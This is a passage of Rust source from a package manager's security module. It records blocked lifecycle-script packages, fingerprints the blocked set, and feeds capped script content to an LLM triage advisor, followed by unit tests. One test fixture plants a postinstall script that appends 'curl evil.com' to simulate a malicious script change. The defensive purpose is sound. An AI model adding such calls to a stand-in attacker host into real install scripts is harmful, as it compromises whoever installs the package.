    store: &PackageStore,
    installed: &[(String, String, Option<String>)],
    policy: &SecurityPolicy,
) -> Result<BlockedSetCapture, LpmError> {
    // Baseline capability defaults: see the matching comment on
    // [`compute_blocked_packages`]. Post-6d-follow-up this
    // wrapper has no production callers — both install entry
    // points (online at install.rs `run_with_options`, offline /
    // fast-path at install.rs `run_link_and_finish`) call
    // `_with_metadata` directly with the project's real
    // capability inputs. This wrapper is retained as the stable
    // test-facing signature so existing tests don't need to
    // construct capability defaults manually.
    capture_blocked_set_after_install_with_metadata(
        project_dir,
        store,
        installed,
        policy,
        &BlockedSetMetadata::default(),
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        None,
    )
}

/// metadata-aware variant of
/// [`capture_blocked_set_after_install`]. Used by the install pipeline
/// where per-package metadata is available; see [`BlockedSetMetadata`].
#[allow(clippy::too_many_arguments)]
pub fn capture_blocked_set_after_install_with_metadata(
    project_dir: &Path,
    store: &PackageStore,
    installed: &[(String, String, Option<String>)],
    policy: &SecurityPolicy,
    metadata: &BlockedSetMetadata,
    // threaded through to
    // `compute_blocked_packages_with_metadata` so install-time
    // capture catches capability-widened packages that strict-
    // match on script-hash.
    requested_capabilities: &crate::capability::CapabilitySet,
    user_bound: &crate::capability::UserBound,
    // see `compute_blocked_packages_with_metadata`.
    // When `Some`, matching triples are removed from the persisted
    // blocked set before fingerprint + write so post-install JSON
    // + the "remain blocked after auto-build" pointer don't report
    // stale state for packages whose scripts already executed via
    // the AdvisorApprovedThisRun trust path. The install caller
    // gates this on `auto_build_attempted` (via
    // `select_approvals_for_capture`); when auto-build won't fire,
    // it passes `None` so approved-but-not-run packages remain
    // visible to `lpm approve-scripts` after the session drops.
    advisor_approvals: Option<
        &std::collections::HashSet<crate::triage_advisor_session::AdvisorApprovalKey>,
    >,
) -> Result<BlockedSetCapture, LpmError> {
    let identities = installed
        .iter()
        .map(|(name, version, integrity)| {
            InstalledPackageIdentity::new(name, version, None, integrity.clone())
        })
        .collect::<Vec<_>>();
    capture_blocked_set_after_install_with_metadata_for_identities_and_exclusions(
        project_dir,
        store,
        lpm_store::StoreVersion::V1,
        &identities,
        policy,
        metadata,
        requested_capabilities,
        user_bound,
        advisor_approvals,
        None,
    )
}

#[allow(clippy::too_many_arguments)]
pub fn capture_blocked_set_after_install_with_metadata_for_identities(
    project_dir: &Path,
    store: &PackageStore,
    installed: &[InstalledPackageIdentity],
    policy: &SecurityPolicy,
    metadata: &BlockedSetMetadata,
    requested_capabilities: &crate::capability::CapabilitySet,
    user_bound: &crate::capability::UserBound,
    advisor_approvals: Option<
        &std::collections::HashSet<crate::triage_advisor_session::AdvisorApprovalKey>,
    >,
) -> Result<BlockedSetCapture, LpmError> {
    capture_blocked_set_after_install_with_metadata_for_identities_and_exclusions(
        project_dir,
        store,
        lpm_store::StoreVersion::from_env(),
        installed,
        policy,
        metadata,
        requested_capabilities,
        user_bound,
        advisor_approvals,
        None,
    )
}

#[allow(clippy::too_many_arguments)]
pub fn capture_blocked_set_after_install_with_metadata_for_identities_and_exclusions(
    project_dir: &Path,
    store: &PackageStore,
    store_version: lpm_store::StoreVersion,
    installed: &[InstalledPackageIdentity],
    policy: &SecurityPolicy,
    metadata: &BlockedSetMetadata,
    requested_capabilities: &crate::capability::CapabilitySet,
    user_bound: &crate::capability::UserBound,
    advisor_approvals: Option<
        &std::collections::HashSet<crate::triage_advisor_session::AdvisorApprovalKey>,
    >,
    execution_exclusions: Option<&HashSet<crate::commands::rebuild::RebuildPackageIdentity>>,
) -> Result<BlockedSetCapture, LpmError> {
    let baseline_index = if store_version == lpm_store::StoreVersion::V2 {
        Some(lpm_store::V2BaselineIndex::for_project(
            project_dir,
            &store.lpm_root()?,
        )?)
    } else {
        None
    };

    let blocked = compute_blocked_packages_with_metadata_and_baseline(
        store,
        installed,
        policy,
        metadata,
        requested_capabilities,
        user_bound,
        BlockedPackageComputationExtras {
            advisor_approvals,
            execution_exclusions,
            baseline_index: baseline_index.as_ref(),
        },
    );
    let fingerprint = compute_blocked_set_fingerprint(&blocked);

    let previous = read_build_state(project_dir);
    let previous_fingerprint = previous.as_ref().map(|p| p.blocked_set_fingerprint.clone());
    let previous_was_non_empty = previous
        .as_ref()
        .is_some_and(|p| !p.blocked_packages.is_empty());

    let fingerprint_changed = previous_fingerprint
        .as_deref()
        .is_none_or(|prev| prev != fingerprint); // no previous state → "changed" from None

    let now_empty = blocked.is_empty();

    // Decide emission:
    let (should_emit_warning, all_clear_banner) = if fingerprint_changed {
        if now_empty && previous_was_non_empty {
            // Positive case: previously had blocked entries, all now approved.
            (true, true)
        } else if now_empty {
            // First install ever AND nothing to block. Silent.
            (false, false)
        } else {
            // First install with blocks, OR new package added, OR script
            // hash drifted. Loud.
            (true, false)
        }
    } else {
        // Fingerprint unchanged: silent regardless of count.
        (false, false)
    };

    let state = BuildState {
        state_version: BUILD_STATE_VERSION,
        blocked_set_fingerprint: fingerprint,
        captured_at: current_rfc3339(),
        blocked_packages: blocked,
        drift_ignore_override: None,
    };

    write_build_state(project_dir, &state)?;

    Ok(BlockedSetCapture {
        state,
        previous_fingerprint,
        should_emit_warning,
        all_clear_banner,
    })
}

/// Path helper. Centralized so any future relocation only changes one site.
pub fn build_state_path(project_dir: &Path) -> PathBuf {
    project_dir.join(".lpm").join(BUILD_STATE_FILENAME)
}

/// Read the package.json from `<store>/<safe_name>@<version>/` and
/// return the `(phase_name, body)` pairs for each entry in
/// [`lpm_security::EXECUTED_INSTALL_PHASES`] that is present and has
/// a non-empty body.
///
/// Replaces the earlier `read_present_install_phases` (names-only)
/// variant. The one caller — [`compute_blocked_packages_with_metadata`]
/// — needs the bodies in to run the static-gate classifier
/// alongside the existing `phases_present` derivation, and folding the
/// two into one pass over the JSON avoids reading / re-parsing
/// `package.json` twice per blocked candidate.
///
/// Returns an empty vec on any of:
/// - missing `package.json` (store miss — the gate already fails
///   closed elsewhere),
/// - malformed JSON,
/// - missing or non-object `scripts` field,
/// - no present install phases with non-empty bodies.
///
/// Output order matches [`lpm_security::EXECUTED_INSTALL_PHASES`]
/// (`preinstall`, `install`, `postinstall`), NOT the order of keys in
/// the source JSON — matching the script-hash invariant so downstream
/// aggregation is stable across re-serializations of `package.json`.
///
/// exposed as `pub` so the version-diff renderer can
/// read both the prior and candidate phase bodies out of the store
/// for unified-diff rendering. Callers outside this module must not
/// assume a body is present in the store — the prior version may
/// have been evicted by `lpm cache clean` or a fresh clone.
pub fn read_install_phase_bodies(pkg_dir: &Path) -> Vec<(String, String)> {
    let pkg_json_path = pkg_dir.join("package.json");
    let Ok(content) = std::fs::read_to_string(&pkg_json_path) else {
        return vec![];
    };
    let Ok(parsed) = serde_json::from_str::<serde_json::Value>(&content) else {
        return vec![];
    };
    let Some(scripts) = parsed.get("scripts").and_then(|v| v.as_object()) else {
        return vec![];
    };

    lpm_security::EXECUTED_INSTALL_PHASES
        .iter()
        .filter_map(|phase| {
            scripts
                .get(*phase)
                .and_then(|v| v.as_str())
                .filter(|s| !s.is_empty())
                .map(|s| ((*phase).to_string(), s.to_string()))
        })
        .collect()
}

/// Extract the `repository` URL from a package's `package.json` at
/// the given store directory.
///
/// Accepts both manifest shapes:
/// - String form: `"repository": "github.com/lovell/sharp"`
/// - Object form: `"repository": { "type": "git", "url": "git+https://github.com/lovell/sharp.git" }`
///
/// Returns the URL as-is when present and non-empty; the advisor's
/// prompt does the host-recognition. Returns `None` if the manifest
/// is missing, unparseable, or doesn't carry the field. **Pure**:
/// reads disk but writes nothing.
pub fn read_manifest_repository(pkg_dir: &Path) -> Option<String> {
    let pkg_json_path = pkg_dir.join("package.json");
    let content = std::fs::read_to_string(&pkg_json_path).ok()?;
    let parsed: serde_json::Value = serde_json::from_str(&content).ok()?;
    let repo = parsed.get("repository")?;
    match repo {
        serde_json::Value::String(s) if !s.is_empty() => Some(s.clone()),
        serde_json::Value::Object(obj) => obj
            .get("url")
            .and_then(|v| v.as_str())
            .filter(|s| !s.is_empty())
            .map(|s| s.to_string()),
        _ => None,
    }
}

/// Maximum bytes of a referenced script's content embedded in the
/// advisor prompt. 32 KB matches the runbook
/// cap. Files larger than this are truncated mid-line and the
/// embedded view ends with a `\n... [truncated for prompt context]\n`
/// marker so the model knows the slice is partial.
pub const REFERENCED_SCRIPT_MAX_BYTES: usize = 32 * 1024;

/// Embeddable file content for the advisor prompt. The runbook caps
/// depth at 1 (no recursive require
/// following) and scope to explicit safe-relative paths.
pub struct ReferencedScriptCap {
    pub filename: String,
    pub content: String,
}

/// Scan a script body for files it delegates to, then read each from
/// the package's store directory with the
/// caps the runbook prescribes:
///
/// - **Depth = 1.** Only the file the body names directly is
///   embedded. A second-level `require` chain stays inside that
///   file's content; if the advisor wants to see it, the user must
///   approve manually.
/// - **Size ≤ 32 KB per file.** Larger files are truncated mid-line
///   with an explicit `... [truncated for prompt context]` marker.
/// - **Path = explicit safe-relative only.** Paths that escape the
///   package root (`..`, absolute, `~`, `$VAR`) are rejected — the
///   script body's escape attempt is itself suspicious; let the
///   advisor see the body without an unsafe embedded view.
/// - **Non-text content rejected.** Binary files (detected by NUL
///   bytes in the first 4 KB) are NOT embedded; the prompt's
///   "delegate-to-binary" suspicion handling kicks in.
///
/// Returns the list of `(filename, content)` pairs for each
/// successfully-read delegate. An empty result means the body
/// doesn't delegate, OR every candidate file was rejected by a cap.
/// Both cases route to the no-embedded-view advisor path.
pub fn collect_referenced_scripts(pkg_dir: &Path, script_body: &str) -> Vec<(String, String)> {
    let candidates = parse_delegated_paths(script_body);
    let mut out = Vec::with_capacity(candidates.len());
    for path in candidates {
        let Some(content) = read_referenced_file(pkg_dir, &path) else {
            continue;
        };
        out.push((path, content));
    }
    out
}

/// Extract relative paths the script body delegates to. Dispatches
/// through [`lpm_security::static_gate::extract_delegate_path`] — the
/// shared parser used by both the script-hash binding and the static
/// gate's own classifier branches. Anything fancier than `node
/// <safe-relative-path>.{js,cjs,mjs}` returns an empty list; the
/// advisor sees the body without an embedded view.
fn parse_delegated_paths(script_body: &str) -> Vec<String> {
    lpm_security::static_gate::extract_delegate_path(script_body)
        .into_iter()
        .collect()
}

/// Read one referenced file from the package directory with the
/// referenced-script caps. Returns `None` for missing files, path-escape
/// attempts (defense in depth — the safe-relative check above
/// should catch these but a sym-linked package root could still
/// surprise us), non-text files (detected by NUL bytes in the head),
/// or read errors. Otherwise returns the file content, truncated at
/// `REFERENCED_SCRIPT_MAX_BYTES` with the explicit marker.
fn read_referenced_file(pkg_dir: &Path, rel_path: &str) -> Option<String> {
    // Defense-in-depth canonical-prefix check: build the absolute
    // path, canonicalize both ends, and confirm the resolved file
    // sits inside `pkg_dir`. This catches sym-link traversals the
    // raw-string `is_safe_relative_path` predicate doesn't see.
    let candidate = pkg_dir.join(rel_path);
    let canonical_root = std::fs::canonicalize(pkg_dir).ok()?;
    let canonical_target = std::fs::canonicalize(&candidate).ok()?;
    if !canonical_target.starts_with(&canonical_root) {
        return None;
    }

    let bytes = std::fs::read(&canonical_target).ok()?;

    // Binary detection: any NUL byte in the first 4 KB pushes the
    // file out of the embed path. Most JavaScript / shell scripts
    // are pure text; a NUL byte is either a compiled binary, a
    // bundled binary blob, or an obfuscation attempt — none of
    // which we want to dump verbatim into a prompt.
    let head = &bytes[..bytes.len().min(4 * 1024)];
    if head.contains(&0u8) {
        return None;
    }

    // UTF-8 conversion is lossy on purpose: the advisor reads the
    // body as untrusted text, so a stray non-UTF-8 byte gets
    // replaced with U+FFFD rather than failing the embed entirely.
    let mut content = String::from_utf8_lossy(&bytes).into_owned();
    if content.len() > REFERENCED_SCRIPT_MAX_BYTES {
        // Truncate at the cap. Walk backward to a char boundary so
        // we don't split a multi-byte sequence (which would render
        // as U+FFFD in the prompt).
        let mut cut = REFERENCED_SCRIPT_MAX_BYTES;
        while cut > 0 && !content.is_char_boundary(cut) {
            cut -= 1;
        }
        content.truncate(cut);
        content.push_str("\n... [truncated for prompt context]\n");
    }
    Some(content)
}

/// — per-tier counts for a blocked set.
///
/// Returns `(green, amber, red)` with these accounting rules:
/// - `Some(Green)` → green.
/// - `Some(Red)` → red.
/// - `Some(Amber)` / `Some(AmberLlm)` / `None` → amber. The two
///   amber variants collapse because they're indistinguishable to
///   the user's "needs review" mental model — `AmberLlm` just means
///   an LLM weighed in. `None` means persisted state predates the
///   triage gate; conservative: count unknowns as amber so the
///   user's eye is drawn to them.
///
/// Exposed so a future `--json` install shape and the human
/// summary line share one counting function.
pub fn count_blocked_by_tier(blocked: &[BlockedPackage]) -> (usize, usize, usize) {
    use lpm_security::triage::StaticTier;
    let mut green = 0usize;
    let mut amber = 0usize;
    let mut red = 0usize;
    for bp in blocked {
        match bp.static_tier {
            Some(StaticTier::Green) => green += 1,
            Some(StaticTier::Red) => red += 1,
            Some(StaticTier::Amber | StaticTier::AmberLlm) | None => amber += 1,
        }
    }
    (green, amber, red)
}

/// — triage-mode install summary line.
///
/// Rendered ONLY when `script-policy = "triage"` is the effective
/// policy. Replaces the multi-line
/// [`crate::commands::rebuild::show_install_build_hint`] output under
/// triage; `deny` / `allow` keep the existing hint untouched.
///
/// **Format (stable-onward; snapshot-tested):**
/// ```text
/// script-policy: triage (N green / M amber / K red → lpm approve-scripts)
/// ```
///
/// Agents parsing the line can substring-match the stable anchor
/// `"script-policy: triage ("` and the suffix
/// `" → lpm approve-scripts)"`. Counts are derived from
/// [`count_blocked_by_tier`] so any future JSON / machine-readable
/// output shares the same arithmetic.
pub fn format_triage_summary_line(blocked: &[BlockedPackage]) -> String {
    let (green, amber, red) = count_blocked_by_tier(blocked);
    format!(
        "script-policy: triage ({green} green / {amber} amber / {red} red → lpm approve-scripts)"
    )
}

fn current_rfc3339() -> String {
    // Use `chrono` for the timestamp (already a workspace dep in lpm-cli;
    // lpm-security uses `time` but that's not depended on here).
    chrono::Utc::now().to_rfc3339()
}

fn hex_lower(bytes: &[u8]) -> String {
    const HEX: &[u8; 16] = b"0123456789abcdef";
    let mut out = String::with_capacity(bytes.len() * 2);
    for &b in bytes {
        out.push(HEX[(b >> 4) as usize] as char);
        out.push(HEX[(b & 0x0f) as usize] as char);
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use lpm_security::TrustedDependencies;
    use lpm_security::TrustedDependencyBinding;
    use std::collections::HashMap;
    use std::fs;
    use tempfile::tempdir;

    fn make_blocked(
        name: &str,
        version: &str,
        integrity: Option<&str>,
        script_hash: Option<&str>,
    ) -> BlockedPackage {
        BlockedPackage {
            name: name.to_string(),
            version: version.to_string(),
            source: None,
            integrity: integrity.map(String::from),
            script_hash: script_hash.map(String::from),
            phases_present: vec!["postinstall".to_string()],
            binding_drift: false,
            // fields — `None` by default in this helper so
            // pre-existing tests behave unchanged. Dedicated tests
            // below exercise the populated path.
            static_tier: None,
            provenance_at_capture: None,
            published_at: None,
            behavioral_tags_hash: None,
            behavioral_tags: None,
        }
    }

    fn make_state(packages: Vec<BlockedPackage>) -> BuildState {
        let fingerprint = compute_blocked_set_fingerprint(&packages);
        BuildState {
            state_version: BUILD_STATE_VERSION,
            blocked_set_fingerprint: fingerprint,
            captured_at: "T00:00:00Z".to_string(),
            blocked_packages: packages,
            drift_ignore_override: None,
        }
    }

    /// M3: the drift_ignore_override field is omitted from on-disk
    /// JSON when None (forward-compatible with pre-fix readers) and
    /// round-trips faithfully when present.
    #[test]
    fn drift_ignore_override_round_trips_through_buildstate_json() {
        let mut state = make_state(Vec::new());
        state.drift_ignore_override = Some(DriftIgnoreAuditRecord {
            mode: "names".into(),
            names: vec!["axios".into(), "lodash".into()],
            honoured_at: "2026-05-16T12:00:00Z".into(),
        });
        let json = serde_json::to_string(&state).unwrap();
        assert!(json.contains("drift_ignore_override"));
        let parsed: BuildState = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed.drift_ignore_override, state.drift_ignore_override);
    }

    #[test]
    fn drift_ignore_override_omitted_from_json_when_none() {
        let state = make_state(Vec::new());
        let json = serde_json::to_string(&state).unwrap();
        assert!(
            !json.contains("drift_ignore_override"),
            "field must be skipped when None, got: {json}",
        );
    }

    // ── BuildState round-trip ────────────────────────────────────────

    #[test]
    fn build_state_round_trips_through_serde() {
        let original = make_state(vec![
            make_blocked("esbuild", "0.25.1", Some("sha512-x"), Some("sha256-y")),
            make_blocked("sharp", "0.33.0", None, Some("sha256-z")),
        ]);
        let json = serde_json::to_string_pretty(&original).unwrap();
        let parsed: BuildState = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed.state_version, original.state_version);
        assert_eq!(
            parsed.blocked_set_fingerprint,
            original.blocked_set_fingerprint
        );
        assert_eq!(parsed.blocked_packages, original.blocked_packages);
    }

    #[test]
    fn build_state_version_field_is_present_and_versioned() {
        let state = make_state(vec![]);
        assert_eq!(state.state_version, BUILD_STATE_VERSION);
        // Const assert: schema version must be at least 1 (compile-time check)
        const _: () = assert!(BUILD_STATE_VERSION > 0);
    }

    // ── read_build_state ─────────────────────────────────────────────

    #[test]
    fn read_build_state_returns_none_when_file_missing() {
        let dir = tempdir().unwrap();
        assert!(read_build_state(dir.path()).is_none());
    }

    #[test]
    fn read_build_state_returns_none_when_file_corrupt() {
        let dir = tempdir().unwrap();
        fs::create_dir_all(dir.path().join(".lpm")).unwrap();
        fs::write(
            dir.path().join(".lpm").join(BUILD_STATE_FILENAME),
            "{not valid json",
        )
        .unwrap();
        assert!(read_build_state(dir.path()).is_none());
    }

    #[test]
    fn read_build_state_returns_none_when_state_version_mismatch() {
        let dir = tempdir().unwrap();
        let mut state = make_state(vec![make_blocked("x", "1.0.0", None, None)]);
        state.state_version = 9999; // forward-compat: never read newer
        fs::create_dir_all(dir.path().join(".lpm")).unwrap();
        fs::write(
            dir.path().join(".lpm").join(BUILD_STATE_FILENAME),
            serde_json::to_string(&state).unwrap(),
        )
        .unwrap();
        assert!(read_build_state(dir.path()).is_none());
    }

    #[test]
    fn read_build_state_returns_some_for_valid_file() {
        let dir = tempdir().unwrap();
        let original = make_state(vec![make_blocked(
            "esbuild",
            "0.25.1",
            Some("sha512-x"),
            Some("sha256-y"),
        )]);
        write_build_state(dir.path(), &original).unwrap();
        let recovered = read_build_state(dir.path()).expect("must read back");
        assert_eq!(recovered.state_version, original.state_version);
        assert_eq!(recovered.blocked_packages.len(), 1);
    }

    // ── write_build_state ────────────────────────────────────────────

    #[test]
    fn write_build_state_creates_lpm_dir_if_missing() {
        let dir = tempdir().unwrap();
        // No .lpm/ exists yet
        assert!(!dir.path().join(".lpm").exists());
        write_build_state(dir.path(), &make_state(vec![])).unwrap();
        assert!(dir.path().join(".lpm").join(BUILD_STATE_FILENAME).exists());
    }

    #[test]
    fn write_build_state_atomic_write_via_temp_file_rename() {
        // Verify the temp file is gone after a successful write — i.e.,
        // the rename happened. We can't easily simulate a crash mid-write
        // in a unit test, but we CAN assert that the temp file artifact
        // isn't left behind on the happy path.
        let dir = tempdir().unwrap();
        write_build_state(dir.path(), &make_state(vec![])).unwrap();

        let lpm_dir = dir.path().join(".lpm");
        let entries: Vec<_> = std::fs::read_dir(&lpm_dir).unwrap().collect();
        // Only the final file should remain — no `.tmp` artifacts
        for entry in entries {
            let name = entry.unwrap().file_name();
            let name_str = name.to_string_lossy();
            assert!(!name_str.ends_with(".tmp"), "temp file leaked: {name_str}");
        }
    }

    #[test]
    fn write_then_read_round_trip_preserves_all_fields() {
        let dir = tempdir().unwrap();
        let original = make_state(vec![BlockedPackage {
            name: "esbuild".into(),
            version: "0.25.1".into(),
            source: None,
            integrity: Some("sha512-foo".into()),
            script_hash: Some("sha256-bar".into()),
            phases_present: vec!["preinstall".into(), "postinstall".into()],
            binding_drift: true,
            // fields: left None in this pre-existing roundtrip
            // test so the assertion stays byte-identical to  the             // original shape.
            static_tier: None,
            provenance_at_capture: None,
            published_at: None,
            behavioral_tags_hash: None,
            behavioral_tags: None,
        }]);
        write_build_state(dir.path(), &original).unwrap();
        let recovered = read_build_state(dir.path()).unwrap();
        assert_eq!(recovered.blocked_packages, original.blocked_packages);
    }

    // ── compute_blocked_set_fingerprint ──────────────────────────────

    #[test]
    fn compute_blocked_set_fingerprint_is_deterministic_across_input_order() {
        let a = vec![
            make_blocked("esbuild", "0.25.1", Some("sha512-x"), Some("sha256-y")),
            make_blocked("sharp", "0.33.0", None, Some("sha256-z")),
        ];
        let b = vec![
            make_blocked("sharp", "0.33.0", None, Some("sha256-z")),
            make_blocked("esbuild", "0.25.1", Some("sha512-x"), Some("sha256-y")),
        ];
        assert_eq!(
            compute_blocked_set_fingerprint(&a),
            compute_blocked_set_fingerprint(&b),
            "fingerprint must be invariant under input reorder"
        );
    }

    #[test]
    fn compute_blocked_set_fingerprint_changes_on_name_change() {
        let a = vec![make_blocked("esbuild", "0.25.1", None, Some("sha256-x"))];
        let b = vec![make_blocked("sharp", "0.25.1", None, Some("sha256-x"))];
        assert_ne!(
            compute_blocked_set_fingerprint(&a),
            compute_blocked_set_fingerprint(&b),
        );
    }

    #[test]
    fn compute_blocked_set_fingerprint_changes_on_version_change() {
        let a = vec![make_blocked("esbuild", "0.25.1", None, Some("sha256-x"))];
        let b = vec![make_blocked("esbuild", "0.25.2", None, Some("sha256-x"))];
        assert_ne!(
            compute_blocked_set_fingerprint(&a),
            compute_blocked_set_fingerprint(&b),
        );
    }

    #[test]
    fn compute_blocked_set_fingerprint_changes_on_script_hash_change() {
        let a = vec![make_blocked("esbuild", "0.25.1", None, Some("sha256-old"))];
        let b = vec![make_blocked("esbuild", "0.25.1", None, Some("sha256-new"))];
        assert_ne!(
            compute_blocked_set_fingerprint(&a),
            compute_blocked_set_fingerprint(&b),
        );
    }

    #[test]
    fn compute_blocked_set_fingerprint_changes_on_integrity_change() {
        let a = vec![make_blocked(
            "esbuild",
            "0.25.1",
            Some("sha512-old"),
            Some("sha256-x"),
        )];
        let b = vec![make_blocked(
            "esbuild",
            "0.25.1",
            Some("sha512-new"),
            Some("sha256-x"),
        )];
        assert_ne!(
            compute_blocked_set_fingerprint(&a),
            compute_blocked_set_fingerprint(&b),
        );
    }

    #[test]
    fn compute_blocked_set_fingerprint_changes_on_source_change() {
        let mut first = make_blocked("shared", "1.0.0", Some("sha512-same"), Some("sha256-same"));
        first.source = Some("directory+./source-a".into());
        let mut second = first.clone();
        second.source = Some("directory+./source-b".into());

        assert_ne!(
            compute_blocked_set_fingerprint(&[first]),
            compute_blocked_set_fingerprint(&[second]),
        );
    }

    #[test]
    fn compute_blocked_set_fingerprint_changes_when_package_added() {
        let a = vec![make_blocked("esbuild", "0.25.1", None, Some("sha256-x"))];
        let b = vec![
            make_blocked("esbuild", "0.25.1", None, Some("sha256-x")),
            make_blocked("sharp", "0.33.0", None, Some("sha256-z")),
        ];
        assert_ne!(
            compute_blocked_set_fingerprint(&a),
            compute_blocked_set_fingerprint(&b),
        );
    }

    #[test]
    fn compute_blocked_set_fingerprint_empty_set_is_stable() {
        let f1 = compute_blocked_set_fingerprint(&[]);
        let f2 = compute_blocked_set_fingerprint(&[]);
        assert_eq!(f1, f2);
        assert!(f1.starts_with("sha256-"));
    }

    #[test]
    fn compute_blocked_set_fingerprint_format_starts_with_sha256_prefix() {
        let f =
            compute_blocked_set_fingerprint(&[make_blocked("x", "1.0.0", None, Some("sha256-y"))]);
        assert!(f.starts_with("sha256-"));
        assert_eq!(f.len(), 71);
    }

    // ── capture_blocked_set_after_install (suppression rule) ──────────
    //
    // These tests construct a synthetic `installed` slice and a fake
    // store directory. The store has to contain a `package.json` with
    // lifecycle scripts so `compute_script_hash` returns Some.

    fn fake_store_with_pkg(
        store_root: &Path,
        name: &str,
        version: &str,
        scripts: &serde_json::Value,
    ) {
        // Mirror PackageStore::package_dir layout: <store_root>/v1/<safe_name>@<version>/
        let safe = name.replace('/', "+");
        let pkg_dir = store_root.join("v1").join(format!("{safe}@{version}"));
        fs::create_dir_all(&pkg_dir).unwrap();
        let pkg = serde_json::json!({
            "name": name,
            "version": version,
            "scripts": scripts,
        });
        fs::write(
            pkg_dir.join("package.json"),
            serde_json::to_string_pretty(&pkg).unwrap(),
        )
        .unwrap();
    }

    fn fake_store_at(store_root: &Path) -> PackageStore {
        // PackageStore::at(root) is the test constructor that creates a
        // store at an arbitrary path with the standard v1 layout under it.
        PackageStore::at(store_root.to_path_buf())
    }

    fn empty_policy() -> SecurityPolicy {
        SecurityPolicy::default_policy()
    }

    fn rich_policy(
        name: &str,
        version: &str,
        integrity: Option<&str>,
        script_hash: Option<&str>,
    ) -> SecurityPolicy {
        let mut map = HashMap::new();
        map.insert(
            format!("{name}@{version}"),
            TrustedDependencyBinding {
                integrity: integrity.map(String::from),
                script_hash: script_hash.map(String::from),
                ..Default::default()
            },
        );
        SecurityPolicy {
            trusted_dependencies: TrustedDependencies::Rich(map),
            minimum_release_age_secs: 0,
        }
    }

    #[test]
    fn capture_emits_warning_on_first_install_with_blocked_packages() {
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "node install.js"}),
        );
        let store = fake_store_at(store_root.path());

        let installed = vec![(
            "esbuild".to_string(),
            "0.25.1".to_string(),
            Some("sha512-x".to_string()),
        )];
        let capture =
            capture_blocked_set_after_install(project.path(), &store, &installed, &empty_policy())
                .unwrap();

        assert!(capture.should_emit_warning);
        assert!(!capture.all_clear_banner);
        assert!(capture.previous_fingerprint.is_none());
        assert_eq!(capture.state.blocked_packages.len(), 1);
        assert_eq!(capture.state.blocked_packages[0].name, "esbuild");
    }

    #[test]
    fn capture_silent_on_first_install_with_no_scriptable_packages() {
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        let store = fake_store_at(store_root.path());

        // Empty installed list — nothing to block
        let capture =
            capture_blocked_set_after_install(project.path(), &store, &[], &empty_policy())
                .unwrap();
        assert!(!capture.should_emit_warning);
        assert!(capture.state.blocked_packages.is_empty());
    }

    #[test]
    fn capture_silent_when_repeating_install_with_unchanged_blocked_set() {
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "node install.js"}),
        );
        let store = fake_store_at(store_root.path());

        let installed = vec![(
            "esbuild".to_string(),
            "0.25.1".to_string(),
            Some("sha512-x".to_string()),
        )];

        // First install: emits
        let cap1 =
            capture_blocked_set_after_install(project.path(), &store, &installed, &empty_policy())
                .unwrap();
        assert!(cap1.should_emit_warning);

        // Second install with the SAME blocked set: silent
        let cap2 =
            capture_blocked_set_after_install(project.path(), &store, &installed, &empty_policy())
                .unwrap();
        assert!(
            !cap2.should_emit_warning,
            "second install with unchanged blocked set must NOT re-warn"
        );
        assert_eq!(
            cap1.state.blocked_set_fingerprint,
            cap2.state.blocked_set_fingerprint
        );
    }

    #[test]
    fn capture_re_emits_when_new_package_added_to_blocked_set() {
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "node install.js"}),
        );
        fake_store_with_pkg(
            store_root.path(),
            "sharp",
            "0.33.0",
            &serde_json::json!({"install": "node-gyp rebuild"}),
        );
        let store = fake_store_at(store_root.path());

        // First install: only esbuild
        let cap1 = capture_blocked_set_after_install(
            project.path(),
            &store,
            &[("esbuild".to_string(), "0.25.1".to_string(), None)],
            &empty_policy(),
        )
        .unwrap();
        assert!(cap1.should_emit_warning);

        // Second install: esbuild + sharp
        let cap2 = capture_blocked_set_after_install(
            project.path(),
            &store,
            &[
                ("esbuild".to_string(), "0.25.1".to_string(), None),
                ("sharp".to_string(), "0.33.0".to_string(), None),
            ],
            &empty_policy(),
        )
        .unwrap();
        assert!(
            cap2.should_emit_warning,
            "adding a new blocked package must re-emit"
        );
        assert_ne!(
            cap1.state.blocked_set_fingerprint,
            cap2.state.blocked_set_fingerprint
        );
    }

    #[test]
    fn capture_re_emits_when_script_hash_drifts_for_existing_package() {
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();

        // Initial install with one script body
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "node install.js"}),
        );
        let store = fake_store_at(store_root.path());
        let installed = vec![("esbuild".to_string(), "0.25.1".to_string(), None)];
        let cap1 =
            capture_blocked_set_after_install(project.path(), &store, &installed, &empty_policy())
                .unwrap();
        assert!(cap1.should_emit_warning);

        // Mutate the package.json in the store to drift the script hash
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "node install.js && curl evil.com"}),
        );

        let cap2 =
            capture_blocked_set_after_install(project.path(), &store, &installed, &empty_policy())
                .unwrap();
        assert!(cap2.should_emit_warning, "script hash drift must re-emit");
        assert_ne!(
            cap1.state.blocked_set_fingerprint,
            cap2.state.blocked_set_fingerprint
        );
    }

    #[test]
    fn capture_emits_positive_clear_banner_when_all_previously_blocked_now_approved() {
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "node install.js"}),
        );
        let store = fake_store_at(store_root.path());

        // First install with empty policy → blocked
        let installed = vec![(
            "esbuild".to_string(),
            "0.25.1".to_string(),
            Some("sha512-x".to_string()),
        )];
        let cap1 =
            capture_blocked_set_after_install(project.path(), &store, &installed, &empty_policy())
                .unwrap();
        assert!(cap1.should_emit_warning);
        assert!(!cap1.all_clear_banner);
        let captured_script_hash = cap1.state.blocked_packages[0].script_hash.clone().unwrap();

        // Second install with a policy that approves esbuild (we use the
